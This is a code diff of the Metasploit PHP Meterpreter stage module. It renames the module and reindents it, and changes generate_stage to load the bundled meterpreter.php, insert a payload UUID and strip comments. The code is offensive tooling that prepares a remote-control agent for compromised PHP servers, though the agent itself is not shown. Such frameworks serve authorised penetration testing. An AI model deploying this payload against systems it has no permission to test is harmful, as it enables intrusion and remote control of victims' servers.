@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -11,28 +9,30 @@ require 'msf/base/sessions/meterpreter_php'
 require 'msf/base/sessions/meterpreter_options'
 
 
-module Metasploit3
-	include Msf::Sessions::MeterpreterOptions
+module MetasploitModule
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'          => 'PHP Meterpreter',
-			'Description'   => 'Run a meterpreter server in PHP',
-			'Author'        => ['egypt'],
-			'Platform'      => 'php',
-			'Arch'          => ARCH_PHP,
-			'License'       => MSF_LICENSE,
-			'Session'       => Msf::Sessions::Meterpreter_Php_Php))
-	end
+  include Msf::Sessions::MeterpreterOptions
 
-	def generate_stage
-		file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'PHP Meterpreter',
+      'Description'   => 'Run a meterpreter server in PHP',
+      'Author'        => ['egypt'],
+      'Platform'      => 'php',
+      'Arch'          => ARCH_PHP,
+      'License'       => MSF_LICENSE,
+      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
+  end
 
-		met = File.open(file, "rb") {|f|
-			f.read(f.stat.size)
-		}
-		#met.gsub!(/#.*?$/, '')
-		#met = Rex::Text.compress(met)
-		met
-	end
+  def generate_stage(opts={})
+    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
+
+    uuid = opts[:uuid] || generate_payload_uuid
+    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
+    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
+
+    met.gsub!(/#.*?$/, '')
+    #met = Rex::Text.compress(met)
+    met
+  end
 end
